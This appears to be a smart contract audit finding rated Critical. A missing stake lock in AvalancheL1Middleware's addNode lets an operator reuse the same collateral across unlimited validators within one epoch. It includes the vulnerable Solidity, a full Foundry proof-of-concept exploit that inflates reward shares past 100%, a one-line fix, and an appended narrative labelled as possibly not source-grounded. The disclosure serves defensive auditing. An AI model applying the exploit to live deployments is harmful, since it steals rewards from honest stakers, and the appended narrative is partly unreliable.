---
id: 23578
severity: "Critical"
---

# Operator can over allocate the same stake to unlimited nodes within one epoch causing weight inflation and reward theft

## Description

The AvalancheL1Middleware::addNode() function is the entry-point an operator calls to register a new P-chain validator. Before accepting the request the function asks _getOperatorAvailableStake() how much of the operator’s collateral is still free. That helper subtracts only operatorLockedStake[operator] from totalStake.

```solidity
function addNode(
    bytes32 nodeId,
    bytes calldata blsKey,
    uint64 registrationExpiry,
    PChainOwner calldata remainingBalanceOwner,
    PChainOwner calldata disableOwner,
    uint256 stakeAmount // optional
) external updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)
    updateGlobalNodeStakeOncePerEpoch {
    ...
    bytes32 valId =
        balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
    uint256 available = _getOperatorAvailableStake(operator);
    ...
}
```

```solidity
function _getOperatorAvailableStake(
    address operator
) internal view returns (uint256) {
    uint48 epoch = getCurrentEpoch();
    uint256 totalStake = getOperatorStake(operator, epoch, PRIMARY_ASSET_CLASS);
    ...
    uint256 lockedStake = operatorLockedStake[operator];
    if (totalStake <= lockedStake) {
        return 0;
    }
    return totalStake - lockedStake;
}
```

However, AvalancheL1Middleware::addNode() never increments operatorLockedStake after it decides to use newStake. As long as the call happens in the same epoch lockedStake remains 0, so every subsequent call to addNode() sees the full collateral as still “free” and can register another validator of maximal weight. Per‑operator stake is therefore double‑counted while the epoch is in progress.

Removal of the excess nodes is only possible through AvalancheL1Middleware::forceUpdateNodes(), which is gated by onlyDuringFinalWindowOfEpoch and can be executed only after the epoch’s UPDATE_WINDOW has elapsed. Because reward accounting (getOperatorUsedStakeCachedPerEpoch() → getActiveNodesForEpoch()) snapshots validators at the start of the epoch, all the extra nodes created early in the epoch are treated as fully active for the whole rewards period. The attacker can therefore inflate their weight and capture a disproportionate share of the epoch’s reward pool.

```solidity
function getActiveNodesForEpoch(
    address operator,
    uint48 epoch
) external view returns (bytes32[] memory activeNodeIds) {
    uint48 epochStartTs = getEpochStartTs(epoch);
    // Gather all nodes from the never-removed set
    bytes32[] memory allNodeIds = operatorNodes[operator].values();
    bytes32[] memory temp = new bytes32[](allNodeIds.length);
    uint256 activeCount;
    for (uint256 i = 0; i < allNodeIds.length; i++) {
        bytes32 nodeId = allNodeIds[i];
        bytes32 validationID =
            balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
        Validator memory validator = balancerValidatorManager.getValidator(validationID);
        if (_wasActiveAt(uint48(validator.startedAt), uint48(validator.endedAt), epochStartTs)) {
            temp[activeCount++] = nodeId;
        }
    }
    activeNodeIds = new bytes32[](activeCount);
    for (uint256 j = 0; j < activeCount; j++) {
        activeNodeIds[j] = temp[j];
    }
}
```

Impact:  
* A malicious operator can spin up an unlimited number of validators without added collateral, blowing past intended per‑operator limits.  
* Reward distribution is skewed: the sum of operator, vault and curator shares exceeds 100 % and honest participants are diluted.

## Proof of Concept

```solidity
//
// PoC: Exploiting the missing stake-locking in addNode()
//
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";
import {Rewards} from "src/contracts/rewards/Rewards.sol";
import {MockUptimeTracker} from "../mocks/MockUptimeTracker.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {VaultTokenized} from "src/contracts/vault/VaultTokenized.sol";
import {PChainOwner} from
"@avalabs/teleporter/validator-manager/interfaces/IValidatorManager.sol";
import {console2} from "forge-std/console2.sol";

contract PoCMissingLockingRewards is AvalancheL1MiddlewareTest {
    // helpers & globals
    MockUptimeTracker internal uptimeTracker; // Simulates uptime records
    Rewards internal rewards; // Rewards contract under test
    ERC20Mock internal rewardsToken; // Dummy ERC-20 for payouts
    address internal REWARDS_MANAGER_ROLE = makeAddr("REWARDS_MANAGER_ROLE");
    address internal REWARDS_DISTRIBUTOR_ROLE = makeAddr("REWARDS_DISTRIBUTOR_ROLE");

    // Main exploit routine ----------------------------------------------------
    function test_PoCRewardsManipulated() public {
        _setupRewards(); // 1. deploy & fund rewards system
        address[] memory operators = middleware.getAllOperators();

        // --- STEP 1: move to a fresh epoch ----------------------------------
        console2.log("Warping to a fresh epoch");
        vm.warp(middleware.getEpochStartTs(middleware.getCurrentEpoch() + 1));
        uint48 epoch = middleware.getCurrentEpoch(); // snapshot for later

        // --- STEP 2: create *too many* nodes for Alice ----------------------
        console2.log("Creating 4 nodes for Alice with the same stake");
        uint256 stake1 = 200_000_000_002_000; // Alice's full stake
        _createAndConfirmNodes(alice, 4, stake1, true); // ← re-uses the same stake 4 times

        // Charlie behaves honestly – one node, fully staked
        console2.log("Creating 1 node for Charlie with the full stake");
        uint256 stake2 = 150_000_000_000_000;
        _createAndConfirmNodes(charlie, 1, stake2, true);

        // --- STEP 3: Remove Alice's unbacked nodes at the earliest possible moment------
        console2.log("Removing Alice's unbacked nodes at the earliest possible moment");
        uint48 nextEpoch = middleware.getCurrentEpoch() + 1;
        uint256 afterUpdateWindow =
            middleware.getEpochStartTs(nextEpoch) + middleware.UPDATE_WINDOW() + 1;
        vm.warp(afterUpdateWindow);
        middleware.forceUpdateNodes(alice, type(uint256).max);

        // --- STEP 4: advance to the rewards epoch ---------------------------
        console2.log("Advancing and caching stakes");
        _calcAndWarpOneEpoch(); // epoch rollover, stakes cached
        middleware.calcAndCacheStakes(epoch, assetClassId); // ensure operator stakes cached

        // --- STEP 5: mark everyone as fully up for the epoch ----------------
        console2.log("Marking everyone as fully up for the epoch");
        for (uint i = 0; i < operators.length; i++) {
            uptimeTracker.setOperatorUptimePerEpoch(epoch, operators[i], 4 hours);
        }

        // --- STEP 6: advance a few epochs so rewards can be distributed -------
        console2.log("Advancing 3 epochs so rewards can be distributed ");
        _calcAndWarpOneEpoch(3);

        // --- STEP 7: distribute rewards (attacker gets oversized share) -----
        console2.log("Distributing rewards");
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, uint48(operators.length));

        // --- STEP 8: verify that the share accounting exceeds 100 % ---------
        console2.log("Verifying that the share accounting exceeds 100 %");
        uint256 totalShares = 0;
        // operator shares
        for (uint i = 0; i < operators.length; i++) {
            totalShares += rewards.operatorShares(epoch, operators[i]);
        }
        // vault shares
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.vaultShares(epoch, vaults[i]);
        }
        // curator shares
        for (uint i = 0; i < vaults.length; i++) {
            totalShares += rewards.curatorShares(epoch, VaultTokenized(vaults[i]).owner());
        }
        assertGt(totalShares, 10000); // > 100 % allocated

        // --- STEP 9: attacker & others claim their rewards ---------
        console2.log("Claiming rewards");
        _claimRewards(epoch);
    }

    // Claim helper – each stakeholder pulls what the Rewards contract thinks
    // they earned (spoiler: the attacker earns too much)
    function _claimRewards(uint48 epoch) internal {
        address[] memory operators = middleware.getAllOperators();
        // claim as operators --------------------------------------------------
        for (uint i = 0; i < operators.length; i++) {
            address op = operators[i];
            vm.startPrank(op);
            if (rewards.operatorShares(epoch, op) > 0) {
                rewards.claimOperatorFee(address(rewardsToken), op);
            }
            vm.stopPrank();
        }
        // claim as vaults / stakers ------------------------------------------
        address[] memory vaults = vaultManager.getVaults(epoch);
        for (uint i = 0; i < vaults.length; i++) {
            vm.startPrank(staker);
            rewards.claimRewards(address(rewardsToken), vaults[i]);
            vm.stopPrank();
            vm.startPrank(VaultTokenized(vaults[i]).owner());
            rewards.claimCuratorFee(address(rewardsToken), VaultTokenized(vaults[i]).owner());
            vm.stopPrank();
        }
        // protocol fee --------------------------------------------------------
        vm.startPrank(owner);
        rewards.claimProtocolFee(address(rewardsToken), owner);
        vm.stopPrank();
    }

    // Deploy rewards contracts, mint tokens, assign roles, fund epochs -------
    function _setupRewards() internal {
        uptimeTracker = new MockUptimeTracker();
        rewards = new Rewards();
        // initialise with fee splits & uptime threshold
        rewards.initialize(
            owner, // admin
            owner, // protocol fee recipient
            payable(address(middleware)), // middleware (oracle)
            address(uptimeTracker), // uptime oracle
            1000, // protocol 10%
            2000, // operators 20%
            1000, // curators 10%
            11_520 // min uptime (seconds)
        );
        // set up roles --------------------------------------------------------
        vm.prank(owner);
        rewards.setRewardsManagerRole(REWARDS_MANAGER_ROLE);
        vm.prank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR_ROLE);
        // create & fund mock reward token ------------------------------------
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 1_000_000 * 1e18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 1_000_000 * 1e18);
        // schedule 10 epochs of 100 000 tokens each ---------------------------
        vm.startPrank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(1, 10, address(rewardsToken), 100_000 * 1e18);
        // 100 % of rewards go to the primary asset-class (id 1) ---------------
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1, 10000); // 10 000 bp == 100 %
        vm.stopPrank();
    }
}
```

## Recommendation

Recommended Mitigation: * Lock stake as soon as a node is created  

```solidity
// inside addNode(), after newStake is finalised
operatorLockedStake[operator] += newStake;
```

Unlock (subtract) it in `_initializeEndValidationAndFlag()` and whenever `_initializeValidatorStakeUpdate()` lowers the node’s stake.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an over‑allocation of stake caused by missing updates to the operatorLockedStake bookkeeping when a new validator node is registered. In the middleware, the function that determines how much collateral an operator has available subtracts only the value stored in operatorLockedStake from the total stake for the current epoch. Because the addNode entry point never increments operatorLockedStake after assigning stake to a node, the locked amount remains zero for the duration of the epoch. Consequently each subsequent call to addNode perceives the full collateral as still free and allows the operator to register another validator with the same stake amount. This results in the same stake being double‑counted across multiple validators within a single epoch.\nThe exploit works as follows: an attacker calls addNode with a stake that is fully covered by their collateral, then repeats the call several times before the epoch ends. Since the contract’s available‑stake calculation never reflects the already‑used stake, every call succeeds and creates a new validator that appears to have full weight. Reward accounting snapshots the set of active validators at the epoch start and distributes rewards based on their recorded weight for the entire rewards period. The extra validators, created early in the epoch, are therefore treated as fully active and receive a proportional share of the reward pool. The attacker’s inflated validator set captures a disproportionate amount of rewards, while the total of operator, vault and curator shares can exceed 100 %, diluting honest participants.\nThe condition for the bug to manifest is that multiple addNode calls occur within the same epoch; the contract only allows removal of excess nodes after the update window via forceUpdateNodes, which is too late to affect the already‑calculated rewards. The issue was discovered during a security audit that examined stake accounting logic and identified that operatorLockedStake was never updated after node creation. It is subtle because the contract correctly reports the operator’s total stake, and the missing lock is not visible in normal operation until an operator intentionally creates many nodes.\nFrom a user’s perspective the symptoms include lower than expected rewards, or even zero payouts despite having staked, and UI displays where the sum of reward shares exceeds 100 %. Honest participants may see their rewards shrink because the attacker’s over‑allocated validators consume a larger slice of the reward pool.\nThe bug belongs to the class of accounting or state‑inconsistency vulnerabilities where a resource is double‑counted due to improper state updates. The conceptual fix is to lock the stake immediately when a node is created by incrementing operatorLockedStake by the amount of stake assigned, and to unlock or decrement that amount when the node’s stake is reduced or the node is removed. Ensuring that the available‑stake calculation always reflects the true amount of collateral already committed prevents the double‑counting and eliminates the ability to inflate validator weight within an epoch.
